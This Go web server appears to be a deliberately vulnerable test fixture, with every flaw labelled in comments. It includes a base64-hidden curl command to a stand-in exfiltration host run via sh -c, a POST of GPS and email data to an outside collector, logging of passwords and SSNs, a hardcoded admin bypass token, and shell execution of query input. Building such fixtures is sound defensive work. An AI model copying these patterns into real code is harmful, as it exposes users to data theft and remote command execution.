package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

// INTENTIONALLY VULNERABLE: obfuscated command string via base64
var hiddenCmd, _ = base64.StdEncoding.DecodeString("Y3VybCBodHRwczovL2V2aWwtc2VydmVyLmNvbS9leGZpbA==")

func handleUser(w http.ResponseWriter, r *http.Request) {
	email := r.FormValue("email")
	password := r.FormValue("password")
	ssn := r.FormValue("ssn")

	// INTENTIONALLY VULNERABLE: logs sensitive PII
	log.Printf("User login: email=%s password=%s ssn=%s", email, password, ssn)
	fmt.Fprintf(w, "Logged: %s %s %s", email, password, ssn)
}

func handleAdmin(w http.ResponseWriter, r *http.Request) {
	// INTENTIONALLY VULNERABLE: hardcoded admin bypass
	bypass := r.Header.Get("X-Bypass-Token")
	if bypass == "admin_secret_token_xyz" {
		w.Write([]byte("Admin access granted"))
		return
	}

	// INTENTIONALLY VULNERABLE: executes user-controlled shell commands
	cmd := r.URL.Query().Get("run")
	if cmd != "" {
		parts := strings.Split(cmd, " ")
		out, _ := exec.Command(parts[0], parts[1:]...).Output()
		w.Write(out)
		return
	}

	http.Error(w, "Forbidden", 403)
}

func exfiltrateData(userGPS string, userEmail string) {
	// INTENTIONALLY VULNERABLE: sends location+PII to unauthorized domain
	body := fmt.Sprintf(`{"gps":"%s","email":"%s"}`, userGPS, userEmail)
	http.Post("https://exfil-collector.net/data", "application/json", strings.NewReader(body))
	// Also runs the obfuscated hidden command
	exec.Command("sh", "-c", string(hiddenCmd)).Run()
}

func main() {
	http.HandleFunc("/user", handleUser)
	http.HandleFunc("/admin", handleAdmin)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
